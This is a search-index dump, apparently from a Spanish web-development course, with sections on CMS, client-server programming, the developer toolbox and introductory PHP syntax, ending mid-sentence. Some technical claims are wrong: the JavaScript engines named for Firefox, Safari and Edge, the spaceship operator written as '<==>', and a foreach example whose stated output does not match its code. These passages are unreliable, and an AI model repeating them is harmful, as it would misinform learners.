{"0": {
    "doc": "1 Sistemas gestores de contenido (CMS)",
    "title": "1. CMS: Sistemas gestores de contenido",
    "content": "Vamos a empezar con algo que no tiene nada que ver con la programación: los CMS. Los Sistemas Gestores de Conentido (CMS = Content Management Systems) son aplicaciones web que permiten montar sitios web sin necesidad de programar una sola línea de código. Así que, sí, los CMS son tus enemigos. Y al enemigo hay que conocerlo. Cuando termines este tema, deberías ser capaz de instalar, configurar y utilizar algunos de los CMS más populares, como Wordpress y Prestashop, para publicar tus propios sitios web. En el caso concreto de Wordpress, también veremos cómo meterle mano al código fuente desarrollando nuestras propias plantillas y plugins (o modificando los que ya existen). ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/#1-cms-sistemas-gestores-de-contenido",
    "relUrl": "/cms/#1-cms-sistemas-gestores-de-contenido"
  },"1": {
    "doc": "1 Sistemas gestores de contenido (CMS)",
    "title": "1 Sistemas gestores de contenido (CMS)",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/",
    "relUrl": "/cms/"
  },"2": {
    "doc": "2.1 Programación cliente-servidor",
    "title": "2.1. Programación cliente-servidor",
    "content": ". | 2.1.1. Un poco de jerga informática | 2.1.2. Una petición web en la época 1.0 | 2.1.3. Una petición web en la época 2.0 | . En los primeros tiempos de Internet, no se ejecutaban programas en el servidor. Solo se pedían páginas estáticas (escritas en HTML) más o menos elaboradas que había sido guardadas en el servidor por un administrador de sistemas. A esto se le denominó web 1.0. A alguien se le ocurrió la idea de que los propios visitantes podrían también crear contenido. Ese contenido se guardaría en el servidor (en archivos o en una base de datos) y posteriormente podría recuperarse para generar con él páginas dinámicas, generadas sobre la marcha. Es decir, documentos HTML que no existieran previamente y que nadie, en realidad, hubiera tecleado, sino que se creasen a partir del contenido almacenado en esos archivos o esa base de datos. Esa web dinámica estaría generada por un programa ejecutado en el servidor, un programa cuya salida sería HTML válido, comprensible por el navegador que la reciba. A esto se le denominó web 2.0 y supuso una revolución tan grande como el propio nacimiento de Internet. 2.1.1. Un poco de jerga informática . Antes de continuar, tienes que asegurarte de que comprendes bien el significado de algunos términos básicos: . | Un servidor es un programa que se ejecuta en una máquina conectada a una red y que permanece dormido hasta que una petición procedente de la red lo despierta. Entonces, el programa hace algo (consulta datos, elabora un cálculo, lo que sea) y devuelve su resultado por la red. Por extensión, un servidor también es cualquier ordenador donde se ejecute un programa servidor. Es decir, usamos la misma palabra para referirnos a un programa y al ordenador donde se ejecuta ese programa. Mala idea, ya lo sé, pero es lo que hay. | El cliente es un programa que envía peticiones al servidor para despertarlo. También es el programa que recoge el resultado devuelto por el servidor. ¿Y sabes qué? Que, por extensión, la máquina donde se ejecuta un programa cliente también se llama cliente. | . Pues bien, en programación web, nuestro cliente es el navegador web (también llamado cliente web). Cualquier navegador del universo conocido entra en esta categoría. Excepto, tal vez, Internet Explorer (sí, esto es un chiste informático). Y un servidor es cualquier máquina de la red donde se esté ejecutando un programa servidor web como Apache, Nginx, Tomcat, IIS y otros cuando viejos amigos que irás conociendo a lo largo de este curso. 2.1.2. Una petición web en la época 1.0 . Ahora que tienes claro qué es un servidor y un cliente web, puedes comprender el siguiente esquema. En él, se ilustra lo que ocurre cuando un cliente web (recuerda: tu navegador) envía al servidor la petición de una página estática. El servidor, en este caso, se limita a enviar al cliente el documento HTML tal cual está almacenado en su disco duro, sin cambiar una sola coma. 2.1.3. Una petición web en la época 2.0 . Con la web 2.0 la cosa cambia bastante porque aparecen las páginas dinámicas, aunque tendrás que fijarte bien en el esquema para apreciar la diferencia. Quédate con lo importante: en este esquema, el cliente web no pide un documento HTML, sino un programa, que puede estar escrito en PHP o algún otro lenguaje. Eso es lo de menos. Ese programa se ejecuta en el servidor, y el resultado de esa ejecución es lo que recibe el cliente, no el programa en sí. Pues bien: si un sitio web funciona del primer modo, no es una aplicación web, sino una página web estática. Para que sea considerado una aplicación web, debe funcionar del segundo modo. ",
    "url": "https://iescelia.org/docs/dwes/_site/php/programacion-cliente-servidor.html#21-programaci%C3%B3n-cliente-servidor",
    "relUrl": "/php/programacion-cliente-servidor.html#21-programación-cliente-servidor"
  },"3": {
    "doc": "2.1 Programación cliente-servidor",
    "title": "2.1 Programación cliente-servidor",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/programacion-cliente-servidor.html",
    "relUrl": "/php/programacion-cliente-servidor.html"
  },"4": {
    "doc": "2.2 Caja de herramientas",
    "title": "2.2. Caja de herramientas para desarrollar de aplicaciones web",
    "content": ". | 2.2.1. HTML | 2.2.3. CSS | 2.2.4. Javascript | 2.2.5. PHP | 2.2.6. MariaDB | . Para desarrollar apliaciones web necesitamos una caja de herramientas bastante completa. Algunas herramientas son fundamentales, como el martillo o el destornillador de una caja de herramientas convencional. Otras, en cambio, son optativas y dependerán del trabajo que vayamos a realizar y de nuestras propias preferencias como desarrolladores. En esta sección vamos a hacer un repaso de las herramientas fundamentales, las que no pueden faltar en tu caja de herramientas. Algunas ya las conoces y otras las aprenderemos a manejar a lo largo de este curso. Se trata de: . | DHTML (HTML, CSS y Javascript) | PHP u otro lenguaje de script de servidor (Python, Ruby, Perl, etc) | MySQL / MariaDB u otro SGBD que permita acceso remoto. | . 2.2.1. HTML . DHTML (Dynamic HTML) no es un lenguaje como tal, sino que, como probablemente sabes ya, es la conjunción de tres lenguajes: . | HTML | CSS | JavaScript | . DHTML, en conjunción con, PHP son los lenguajes que nos van a permitir ejecutar programas en el servidor y acceder a sus recursos a través de páginas web, pero existen otras posibles combinaciones como: . | DHTML con ASP | DHTML con JSP | DHTML con Python, Ruby, Perl, etc. | . HTML significa “HyperText Markup Language” (Lenguaje de Etiquetas de Hipertexto). Como sin duda sabrás, se trata de un lenguaje para formatear documentos: . | Permite definir el tipo de letra, tamaño, formato y color de los textos. | Permite insertar imágenes y otro contenido multimedia. | Permite crear listas, tablas, enumeraciones… | Permite crear enlaces entre secciones del mismo documento, o enlaces con otros documentos (hipertexto) | . A lo largo de este texto supondremos que tú, lector o lectora, estás familiarizado con HTML. Tampoco es que necesites un nivel profesional para entenderlo todo, pero conocerlo con cierta profundidad te ayudará. Y, desde luego, si no conoces HTML en absoluto, no comprenderás nada de lo que ocurra a partir de ahora. Por lo tanto, si HTML es para ti un desconocido, es mejor que pares aquí y busques un poco de información al respecto antes de continuar. Te sorprenderá ver que HTML es bastante sencillo de comprender. Recuerda que HTML NO es un lenguaje de programación: no permite programar algoritmos. Pero sí permite incrustar otros lenguajes de programación en su interior, como enseguida veremos. Esos trozos de código incrustados dentro de HTML se denominan scripts. Brevísima historia de HTML . | En 1990 se crea HTML (procedente de un lenguaje anterior, SGML) junto con la World Wide Web, para formatear los documentos de la www. | Se amplía en sucesivas versiones hasta la 3.0, que no consiguió éxito debido a las limitaciones de los navegadores de la época. | Comienza la guerra de navegadores: Microsoft y Netscape sacan sus propios “dialectos” de HTML y destrozan en estándar. | A partir de HTML 4, los navegadores intentan unir las características de los dos, pero el resultado es demasiado confuso y complejo. | Se hace evidente que hay que hacer una “limpieza” de HTML. Así surge XHTML, la versión XML de HTML, mucho más estricta y formal, con menos añadidos pero igual de potente. | . Después de esta accidentada historia, nos encontramos que, en la situación actual, las versiones de HTML que puedes encontrarte pululando por la www son: . | HTML 4.01 transicional: HTML clásico, con todos los elementos del HTML antiguo. En la actualidad está obsoleto, pero aún quedan muchas páginas antiguas que lo utilizan. | HTML 4.01 estricto: también llamado XHTML, no permite usar los elementos HTML desaprobados, tales como definición de formatos. También se considera obsoleto. | HTML5: elimina definitivamente los elementos antiguos del lenguaje e incorpora algunos nuevos para completar la asimilación con XML. Es el estándar actual. | La especificación para HTML6 (o HTML Next) está actualmente en desarrollo. | . 2.2.3. CSS . CSS significa “Cascade Style Sheet” (Hojas de estilo en cascada). CSS, como sin duda ya sabes, es un lenguaje para la definición de los formatos utilizados en una página web. Sólo permite definir el formato (es decir, el aspecto: colores, tipografías, disposición de los elementos…) de la página, no su contenido. Al definir los formatos en otra parte, se pueden reutilizar a lo largo de una o incluso de varias páginas: si cambiamos la definición CSS del formato, se cambian automáticamente los formatos de todas las páginas que usen esa definición. El objetivo último de CSS es separar completamente el formato de la página de su contenido. CSS 2.1 se usaba con HTML 4. CSS3 se usa con HTML5 y se considera el estándar actual. Está soportado universalmente, aunque, como sin duda habrás sufrido en tus carnes, los diferentes navegadores pueden interpretar de forma ligeramente distinta algunas definiciones CSS. Si todo esto te suena tan raro como el idioma Kinglon, deberías aprender un poco de CSS antes de continuar. Explicar los fundamentos de CSS excede a los propósitos de este texto. Si aún los desconoces, encontrarás muchos recursos sobre CSS en la red. Tampoco es necesario que te conviertas en un experto/a en CSS de la noche a la mañana, ni mucho menos: con que comprendas su sintaxis básica es suficiente. El resto puede consultarse en cualquier manual online de referencia y ya mejorarás con el tiempo y la experiencia. 2.2.4. Javascript . JavaScript es un lenguaje interpretado que puede ser incrustado dentro del código HTML de una página web. El código JavaScript puede interactuar y modificar cualquier parte del documento HTML, por lo que dota a las páginas web de dinamismo e interactividad. JavaScript no es Java, por mucho que su nombre se parezca. También su sintaxis puede recordar un poco a Java en algunas ocasiones. Pero déjame que te lo repita de nuevo: Javascript no es Java. Se parecen tanto como un euro y un yen japonés. Las dos son monedas de curso legal, pero ahí terminan sus semejanzas. La implementación de JavaScript de cada navegador es distinta, obteniéndose resultados que no siempre son iguales, por desgracia para los desarrolladores. Por ejemplo, el motor Javascript de Chrome se llama V8, mientras que el de Firefox es Rhino y el de Safari y Microsoft Edge es WebKit. Este texto tampoco es un manual de Javascript. Nuevamente, si no sabes nada de Javascript, debes detenerte aquí y aprender los fundamentos antes de continuar, o te perderás una parte importante de lo que sigue. Y, nuevamente, no es necesario que te conviertas en un fuera de serie del lenguaje. De momento, basta con que lo comprendas y hayas hecho unas cuantas prácticas con él. Irás mejorando con la experiencia. Porque déjame que te cuente un secreto: no se puede programar una aplicación web solo con PHP. Cualquier aplicación web lleva parte de su código en el servidor (PHP u otro lenguaje de servidor) y parte en el cliente (ya sabes: HTML, CSS y Javascript), si bien es cierto que muchos programadores se especializan más en una parte que en la otra. Pero debes conocer ambas caras de la moneda para poder participar con éxito en el desarrollo de una aplicación web completa. Por último, ten en cuenta que son muy pocos los desarrollos que, en la actualidad, se hacen directamente con Javascript clásico en el lado del cliente. Lo más habitual es utilizar librerías más o menos simples, o incluso completísimos frameworks, que ocultan el Javascript que existe debajo. Algunas de las librerías más populares son: Prototype, jQuery, Angular, Vue.js o React. 2.2.5. PHP . PHP es un acrónimo recursivo. Significa “PHP Hypertext Preprocessor”. Sí, así es el sentido del humor de los informáticos. Qué le vamos a hacer. PHP es un lenguaje de programación de propósito general. De hecho, junto con librerías como PHP-Qt o PHP-GTK, puedes programar con él cualquier aplicación de escritorio con sus ventanitas, sus botoncitos y toda la pesca. Pero, por circunstancias más debidas al azar que a otra cosa, se empezó a usar para desarrollo web al comienzo de la web 2.0, y hoy en día se utiliza casi exclusivamente para ese propósito. Que es el propósito que a nosotros nos interesa, claro. Cuando se usa en desarrollo web, PHP aparece embebido dentro de documentos HTML. Enseguida veremos cómo se hace eso. Igual que sucedía con Javascript, pocos proyectos nuevos se desarrollan con PHP clásico. Lo normal es usar un framework (o colección compleja de librerías) que ocultan en todo o en parte el funcionamiento de PHP, que sigue corriendo debajo. Por supuesto, cualquier desarrollador/a web debe conocer tanto PHP como el funcionamiento de los frameworks que corren sobre PHP. Nosotros nos centraremos primero en PHP clásico, y más adelante veremos los frameworks para PHP, centrándonos en uno de los más populares y potentes que existen en la actualidad: Laravel. Características de PHP . | PHP permite conectarse con múltiples bases de datos: MySQL, MariaDB, Oracle, PostgreSQL, SQL Server, DB2, etc. También puede conectar por ODBC. | Se parece mucho a otros lenguajes de tercera generación y orientados a objeto (en particular a C/C++ y, por tanto, a Java). Su curva de aprendizaje para los que ya saben programar es muy plana. | Es un lenguaje con tipado dinámico y débil. Es decir, los tipos de datos se asignan en tiempo de ejecución y pueden mezclarse tipos de datos con bastante libertad. Esto tiene ventajas e inconvenientes que descubrirás en tus carnes cuando empieces a programar con PHP. | Es un lenguaje orientado a objetos, pero conserva todas las características de los lenguajes estructurados, es decir: se puede programar sin recurrir a los objetos. Un punto a su favor para nostálgicos, aunque lo recomendable es programar con objetos siempre. | Es un lenguaje tremendamente flexible. Casi todo se puede hacer de tres o cuatro formas diferentes. Eso le permite adaptarse a los gustos personales de cada programador/a. | . Brevísima historia de PHP . | Surge en 1995 como extensión de CGI (otro lenguaje para acceso a funciones del servidor) | PHP3 (1998) tuvo un gran éxito comercial. | PHP4 (2000) es la versión más extendida (por desgracia): la mayoría de los scripts en PHP que circulan por la red están escritos en esta versión obsoleta. | PHP5 (2004) tiene soporte para orientación a objetos y una biblioteca de clases bastante bien diseñada. Por lo tanto, desde esta versión PHP pasa de ser un lenguaje estructurado (3GL) a ser un lenguaje orientado a objetos. | PHP6 empezó a desarrollarse en 2007 y se canceló en 2014. | PHP7 introdujo novedades menores y estuvo vigente hasta 2020. En el momento de escribi esto (junio de 2021) es la versión dominante en la mayoría de los servidores web. | PHP8 es la última versión (8.1.7 cuando escribo esto, en septiembre de 2022). Las versiones PHP4 y PHP5 se consideran obsoletas e inseguras, aunque muchas aplicaciones existentes aún las utilicen. Sigue habiendo soporte para PHP7, pero todas las nuevas aplicaciones se deberían escribir pensando en PHP8. | . Lo nuevo en PHP8 . PHP8 no tiene demasiadas novedades con respecto a PHP7, como este no las tenía con respecto a PHP5. Debes tener en cuenta que el mayor salto evolutivo se produjo entre PHP 4 y PHP 5. A partir de ahí, y para principiantes como nosotros, la cosa no ha cambiado demasiado. Algunas de las novedades más destacables de PHP8 son de este calibre: . | Mejoras importantes de rendimiento, con la aparición de JIT (Just in Time Compiler), un compilador de PHP que trabaja de forma transparente al programador para incrementar la velocidad de ejecución. | Mejoras menores en el manejo de las clases y métodos abstractos. | Simplificación en la declaración de atributos. | Posibilidad de usar arrays con índices negativos. | . Como ves, nada que vaya a revolucionar la forma de trabajar con PHP. Ventajas de PHP sobre otros lenguajes . PHP es el líder indiscutible en el desarrollo de aplicaciones web del lado del servidor. Hace años (¡muchos!) que algunos se empeñan en decir que está muerto o que está destinado a desaparecer, pero sigue ahí, obstinadamente en el número uno. Por algo será. Algunas de las ventajas que han hecho de PHP el líder de los lenguajes del lado del servidor durante tanto tiempo son: . | Es un lenguaje libre y abierto. | Es muy eficiente (comparado con otros lenguajes del lado del servidor). | Es ejecutable en (casi) cualquier servidor. | Cuenta con una excelente documentación y miles de foros y sitios donde consultar dudas. | La curva de aprendizaje es baja si ya sabes programar. | Existen mogollón de entornos de desarrollo para PHP, para todos los gustos. | Ofrece fácil interoperatibilidad con otros sistemas, en particular con bases de datos. | Comunidad muuuy grande. | Su sintaxis, estabilidad y seguridad han mejorado enormemente desde los tiempos algo caóticos de PHP4. | . Inconvenientes de PHP con respecto a otros lenguajes . PHP también presenta algunos inconvenientes, por supuesto. No hay nada perfecto. Entre ellos, podemos destacar: . | Fallos de diseño (corregidos en su mayoría a partir de PHP5), como: . | Los métodos para acceso a bases de datos cambian según el SGBD usado. | Nombres de funciones inconsistentes. | No es completamente orientado a objetos. | Tipado confuso y, a veces, impredecible. | . | Grandes (e incompatibles) cambios entre versiones. | Pérdida lenta pero constante de cuota de mercado. | Pésima relación señal/ruido en la web: ¡hay demasiados malos desarrolladores en PHP! | . Gestión de dependencias con composer . Aunque PHP puede instalarse como un programa independiente, en el contexto del desarrollo de aplicaciones web siempre se utiliza como parte de un servidor web. Casi todos los servidores web proporcionan soporte nativo para PHP. Por ejemplo, Apache lo incorpora “de serie”, de modo que solo tenemos que tener un servidor con Apache instalado para poder desarrollar con PHP. Lo mismo puede decirse de otros servidores basados en sistemas Unix y Linux, como nginx o lighttpd. Cuando las aplicaciones se empiezan a hacer complejas, suele ser habitual que necesitemos paquetes de PHP que no son estándar, es decir, que no vienen con el lenguaje. Podemos instalarlos manualmente, desde luego, pero PHP, como todos los lenguajes medianamente serios, tiene su propio gestor de dependencias llamado composer. composer se usa desde la línea de comandos y trabaja utilizando un archivo de configuración llamado composer.json (porque está escrito en formato JSON) donde se especifican qué paquetes (o librerías) usa el proyecto en cuestión. Al ejecutar composer, ese archivo es leído y las dependencias instaladas o actualizadas en una carpeta del proyecto llamada /vendor. De ese modo, podemos tener todas las librerías correctamente instaladas y actualidadas con facilidad. El aspecto del archivo de configuración composer.json es algo así: . { \"require\": { \"monolog/monolog\": \"2.0.*\", \"phpunit/phpunit\": \"^9.5\", \"phpunit/php-code-coverage\": \"^9.2\" } } . Con la clave require le estamos indicando a composer que los paquetes siguientes son imprescindibles para nuestro programa y que tiene que instalarlos en /vendor junto con todas sus dependencias (si las tuvieran), es decir, junto con cualquier otra librería que esos paquetes necesiten para funcionar. El nombre de cada paquete está formado por el nombre del fabricante seguido del nombre del proyecto en cuestión. A menudo, ambos nombres son iguales (como en “monolog/monolog”), pero a veces no es así (“php-unit/php-code-coverage”). A continuación del nombre se indica la versión del paquete que necesitamos. Se pueden usar símbolos comodín. Así, por ejemplo, “2.0.*” significa “2.0.” seguido de cualquier otro número, mientras que “^9.5” significa “versión 9.5 o superior”. Existen otras secciones que se pueden añadir al archivo composer.json, como: . | require-dev: paquetes necesarios solo en el entorno de desarrollo (no en el de producción). | autoload: paquetes que deben cargarse automáticamente en memoria durante la ejecución de la aplicación, de manera que no sea necesari incluirlos con include o require. | conflict: paquetes que no funcionan bien con tu aplicación y que no deben ser instalados en ningún caso. | . La configuración de composer tiene muchos recovecos y se puede convertir en algo bastante complicado. No es nuestra intención dar ahora un curso sobre composer. Solo tienes que saber cómo añadir las librerías necesarias para tu aplicación (con require) y cómo lanzar su instalación y actualización. Para instalar los paquetes que necesita tu aplicación, solo tienes que teclear este comando (en el directorio raíz de tu aplicación, donde ya debe existir composer.json): . $ composer install . También se puede instalar un paquete suelto, sin necesidad de añadirlo a composer.json: . $ composer install nombre-del-paquete . Si lo que quieres es actualizar los paquetes de composer.json a la última versión disponible, teclea esto: . $ composer update . Por último, si quieres lanzar la autocarga de paquetes (los que hayas puesto en la sección “autoload”), teclea: . $ composer dump-autoload . Desde luego, composer tiene otras muchas opciones que no vamos a ver en este momento. Este es el uso básico de este gestor de dependencias, e irás aprendiendo otras cosas sobre él conforme lo necesites. 2.2.6. MariaDB . Otra de las herramientas básicas de nuestra caja de herramientas es el gestor de bases de datos relacionales (SGBD). MariaDB es el SGBD líder del mercado de las aplicaciones web. Nos permitirá conectarnos a una base de datos en red y ejecutar sentencias SQL de forma remota al visitar una aplicación web. Existen otras posibilidades, desde luego. Entre las más populares están: . | MySQL | SQL Server | Oracle | PostgreSQL | SQLite | . También está la posibilidad de usar base de datos no relacionales, como MongoDB, Cassandra o Redis. PHP puede conectarse también a estos sistemas, pero la forma de trabajar es diferente que con bases de datos relacionales. Como estas últimas son, de lejos, las predominantes en el mercado, nos centraremos en ellas. A partir de ahora, cuando hablemos de bases de datos, siempre nos estaremos refiriendo a MariaDB o MySQL indistintamente (ya que, en la práctica, son indistinguibles para el desarrollador), pero cualquier otra base de datos relacional puede usarse del mismo modo con mínimos cambios en el código fuente. Características de MariaDB . | MariaDB es un gestor de bases de datos relacional multiusuario y multiplataforma. | Permite mútiples conexiones remotas. | Es software libre. | Existen librerías para acceder a MariaDB desde muchos lenguajes: C/C++, Java, PHP, Perl, Pascal… Además, hay drivers ODBC. | Está muy extendida en aplicaciones web, generalmente en combinación con PHP. | Cuenta un interfaz gráfico programado en PHP, llamado PHPMyAdmin, que se ejecuta en el navegador web. Por supuesto, se puede usar cualquier otro cliente compatible con MySQL, como MySQL Workbench. | . Brevísima historia de MariaDB . | MySQL surgió como un proyecto OpenSource en Suecia en 1995. | El objetivo era lograr un SGBD rápido y fiable que cumpliera con el estándar SQL. | Las primeras versiones (que se denominaron mSQL) eran muy ineficientes. | La popularización de PHP y su ganancia en eficiencia a partir de la versión 3 la han hecho muy popular en la actualidad. | Tras su adquisición por Oracle, se intentó relegar al segmento medio-bajo en el mercado de los SGBD y surgió un fork: MariaDB (traducción para los recién llegados: “fork” significa “proyecto nuevo surgido a partir de otro proyecto ya existente”). | La versión más reciente (cuando escribo esto, en septiembre de 2022) es MariaDB 10.9.2 | . ",
    "url": "https://iescelia.org/docs/dwes/_site/php/caja-de-herramientas.html#22-caja-de-herramientas-para-desarrollar-de-aplicaciones-web",
    "relUrl": "/php/caja-de-herramientas.html#22-caja-de-herramientas-para-desarrollar-de-aplicaciones-web"
  },"5": {
    "doc": "2.2 Caja de herramientas",
    "title": "2.2 Caja de herramientas",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/caja-de-herramientas.html",
    "relUrl": "/php/caja-de-herramientas.html"
  },"6": {
    "doc": "2.3 Sintaxis de PHP",
    "title": "2.3. La sintaxis de PHP",
    "content": ". | 2.3.1. Cómo incrustar PHP dentro de HTML | 2.3.2. Comentarios | 2.3.3. Variables y constantes | 2.3.4. Operadores | 2.3.5. Arrays | 2.3.6. Estructuras de control | 2.3.7. Funciones y procedimientos | 2.3.8. Clases y objetos | 2.3.9. Salida de datos | 2.3.10. Paso de parámetros por la URL | 2.3.11. Entrada de datos a través de formulario | 2.3.12. Validación y saneamiento de formularios | 2.3.13. Namespaces | 2.3.14. Extensiones de PHP y referencia del lenguaje: cómo usar la biblioteca del lenguaje sin volverse loco | . 2.3.1. Cómo incrustar PHP dentro de HTML . El código PHP se escribe incrustado dentro de un documento de texto mediante estas etiquetas: . &lt;?php .... ?&gt; . Este archivo debe tener SIEMPRE extensión .php, NO .html . Cuando el servidor web encuentre un archivo con extensión .html, lo enviará al cliente sin mirar ni siquiera lo que hay en su interior. En cambio, cuando el servidor web encuentre un archivo con extensión .php, lo abrirá y buscará las etiquetas &lt;?php … ?&gt;, y ejecutará el código que haya dentro antes de enviar el resultado al cliente. El resto del archivo, es decir, lo que esté fuera de las etiquetas de PHP, se enviará al cliente sin modificar. 2.3.2. Comentarios . Los comentarios de PHP se pueden escribir de varias formas: . // Comentario de una línea # Comentario de una línea /* Comentario de una o varias líneas */ . 2.3.3. Variables y constantes . Las variables de una función/clase/método PHP son siempre locales, es decir, sólo están disponibles en esa función/clase/método, salvo que se indique otra cosa. Si se definen variables fuera de una función, serán globales a todo el fichero actual, pero no pueden usarse en el código ubicado en otros ficheros. Existen maneras de lograr que una variable sea global a todo el código, pero, vamos… ¿en serio quieres hacer eso? . (Nota anticipatoria: hay ciertas situaciones en las que una aplicación web necesita variables globales, pero ya lo veremos en su momento. Por ahora, solo recuerda que usar variables globales es una pésima práctica de programación). El identificador de variable siempre debe empezar por $. Esta es una peculiaridad de PHP que al principio descoloca un poco. En PHP, no es necesario declarar las variables: al inicializarlas queda especificado el tipo. A partir de PHP7 pueden indicarse los tipos predefinidos (int, float, string…), pero solo es algo optativo. Ejemplos: . $a = 4; // Variable entera (PHP5+) int $a = 4; // Variable entera (PHP7+) $media = 52.75; // Variable real $texto = \"Hoy es lunes\"; // Variable string . Cualquier variable puede cambiarse de tipo con funciones como intval(), floatval() o strval(): . $a = \"10\"; // $a es una cadena $b = intval($a); // $a se convierte a entero y se asigna a $b . Como no hay que declarar las variables, a veces no estaremos seguros de si una variable existe y tiene un valor válido (no nulo) asignado. Para averiguarlo existe la función isset(), que nos devuelve true si la variable existe y false en caso contrario. Del mismo modo, hay otra función muy útil, unset(), que hace desaparecer a una variable ya definida y libera la memoria que ocupaba: . if (isset($nombre)) { echo $nombre; // Solo muestra el nombre si la variable tiene algún valor } else { echo \"El nombre no está definido\"; } . El tipado de PHP es débil, así que puedes encontrarte expresiones donde se mezclen tipos. PHP hará las conversiones que le parezca oportunas, con resultados a veces imprevisibles, por lo que no es buena idea recurrir a estas estratagemas a menos que sepas muy bien lo que estás haciendo y el resultado que obtendrás. Por ejemplo: . $a = 3; // a es un integer $b = \"Hoy es lunes\"; // b es un string $c = $a + $b; // ¡Esto funciona, pero ¿a que no predices bien el resultado? . Los tipos de datos predefinidos en PHP son: . | integer (entero) | double (real) | bool (booleano) | string (cadena) | array (pues eso) | . En cuanto a las constantes, se crean con la función define(): . define(\"NOMBRE\", \"Pepito Pérez\"); // NOMBRE es una constante echo NOMBRE; // Muestra el valor de la constante. ¡Fíjate en que no lleva el símbolo $! . Las constantes, por convenio, suelen nombrarse en MAYÚSCULAS. El propio PHP tiene muchas constantes predefinidas (todas en mayúsculas) de ámbito global, como PHP_VERSION o PHP_OS. Algunas de estas constantes predefinidas empiezan y terminan por un doble subrayado, como __LINE__ o __FILE__. Estas constantes se llaman constantes mágicas y nos van a resultar muy útiles más adelante. 2.3.4. Operadores . Los operadores en PHP son iguales que los de Java, que, a su vez, los heredó de C/C++: . | Asignación: $a = 3; | Comparación: ==, &lt;=, &gt;=, !=, &lt;=&gt;, etc. | Operadores aritméticos: +, -, *, /, %… | Operadores lógicos: &amp;&amp;, ||, ! | Operadores de asignación combinados: +=, -=, ++, –, *=, /=, etc | . Existen operadores más esotéricos, como el operador ternario o los operadores a nivel de bit, que no usaremos demasiado. Sin embargo, PHP cuenta con algunos operadores curiosos que a lo mejor no conoces y que te pueden ahorrar mucho trabajo. Te los cuento brevemente: . Operador de coalescencia nulo. Con ese nombre tan rebuscado se conoce al operador ?? (doble interrogante). Simplemente, asigna a una variable valor u otro dependiendo de si está definida o no: . $user = $nombreUsuario ?? \"sin-nombre\"; . La variable $user del ejemplo anterior tomará el valor $nombreUsuario si y solo si esa variable, $nombreUsuario, existe y tiene un valor asignado. En caso contrario, tomará el valor “sin-nombre”. Operador nave espacial. Así se conoce el operador &lt;==&gt;. ¡Otro bonito chiste de informáticos! Se usa para comparar dos expresiones y decidir cuál es la menor. Devuelve -1 (si la primera expresión es menor que la segunda), 0 (si son iguales) o 1 (si la primera expresión es mayor que la segunda): . $resultado = $var1 &lt;==&gt; $var2; echo $resultado; // Mostrará -1, 0 o 1, dependiendo de los valores de $var1 y $var2 . 2.3.5. Arrays . Los arrays en PHP son colecciones de variables del mismo o de distinto tipo identificadas por un índice. Se parecen más a los ArrayList de Java que a los arrays clásicos propiamente dichos. $a[1] = \"lunes\"; $a[2] = 1; // El array de PHP puede contener datos de diferente tipo en cada elemento $a[3] = \"martes\"; $a[4] = 2; etc. El índice no tiene por qué ser un número entero: puede ser un String (array asociativo): . $a[\"ESP\"] = \"España\"; $a[\"FRA\"] = \"Francia\"; $a[\"POR\"] = \"Portugal\"; . Como los arrays son objetos, dispones de un montón de métodos y atributos para consultarlos y manipularlos. No es mi intención proporcionarte aquí una lista exhaustiva, porque son muchos y para eso ya está la documentación oficial, pero sí te voy a mostrar algunos que te permitan hacerte una idea: . | count($a): devuelve el número de elementos del array $a. | in_array(“valor”, $a): busca el elemento “valor” en el array $a. Devuelve true o false. | unset($a[4]): elimina un elemento (el 4, en este ejemplo) del array $a. | next($a): devuelve el siguiente elemento de un array (el primero, si es la primera vez que se invoca). | prev($a): devuelve el elemento anterior de un array (el último si es la primera vez que se invoca). | array_push($a, $elemento): añade el $elemento al final del array $a. | $elemento = array_pop($a): elmina el último elemento del array $a (y lo asigna a la variable $elemento). | sort($a) y asort($a): ordena el array $a. sort() se utiliza con arrays convencionales y asort() con arrays asociativos. | . 2.3.6. Estructuras de control . Vamos a hacer un repaso muy rápido por las estructuras de control de PHP. Si ya conoces otros lenguajes como Java, todas te resultarán familiares. Condicionales . El condicional doble tiene la sintaxis habitual: . if (condición) { acciones-1; } else { acciones-2; } . Por supuesto, la parte del else puede eliminarse si no la necesitas, y obtendrías un condicional simple. Bucle while . El bucle de tipo while tiene este aspecto: . while (condición) { acciones; } . Bucle repeat . El bucle de tipo repeat, es decir, con la condición al final, tiene esta sintaxis: . do { acciones; } while (condición); . Bucles for y foreach . El bucle for controlado por contador es idéntico a C/C++ y Java: . for (inicialización; condición; incremento) { acciones; } . Hay una variedad de bucle for muy interesante: el bucle foreach para recorrido de arrays asociativos: . foreach ($array as $índice=&gt;$var) { acciones; } . El bucle foreach se repite una vez para cada valor guardado en el array. Ese valor se asigna a la variable $var en cada repetición. Por ejemplo: . $a[\"ESP\"] = \"España\"; $a[\"FRA\"] = \"Francia\"; $a[\"POR\"] = \"Portugal\"; foreach ($a as $pais=&gt;$codigo) { echo \"Nombre del país: $pais - Código: $codigo&lt;br&gt;\"; } . La salida de este programa será: . Nombre del país: España - Código: ESP Nombre del país: Francia - Código: FRA Nombre del país: Portugal - Código: POR . break y continue . Como en muchos otros lenguajes, las instrucciones break y continue pueden usarse en el interior del cuerpo de los bucles para lograr este comportamiento: . | break. “Rompe” el bucle, es decir, se sale del bucle y continúa ejecutando el programa por la instrucción que haya inmediatamente después del mismo. | continue. Deja de ejecutar la iteración actual y vuelve al comienzo del bucle para iniciar una nueva iteración. | . Sintaxis alternativa con dos puntos . Las estructuras de control de PHP tienen una sintaxis alternativa que elimina el uso de las llaves, muy denostadas por algunos programadores. Por ejemplo, una instrucción if puede escribirse de forma tradicional: . if ($i &lt; 0) { echo \"La variable es menor que cero\"; } . …o bien con la “sintaxis dos puntos”: . if ($i &lt; 0): echo \"La variable es menor que cero\"; endif; . Puedes elegir la sintaxis con la que te sientas más cómodo/a. Nosotros, en este manual, usaremos la primera por estar más extendida, pero las dos son igualmente válidas. 2.3.7. Funciones y procedimientos . Los subprogramas (funciones y procedimientos) se escriben en PHP del mismo modo: con la palabra function. | Las funciones deben devolver un valor en su última línea con return. Si necesitas devolver varios valores, puedes empaquetarlos en un array o en un objeto. Ten en cuenta que, después de un return, la función terminará de forma inmediata y devolverá el control de ejecución al código desde la que fue invocada. Es decir: cualquier línea de código de la función que esté por debajo del return nunca se ejecutará. | Los procedimientos no tienen return. Realizan su función y terminan. | . Los argumentos de las funciones o procedimientos en PHP siembre se 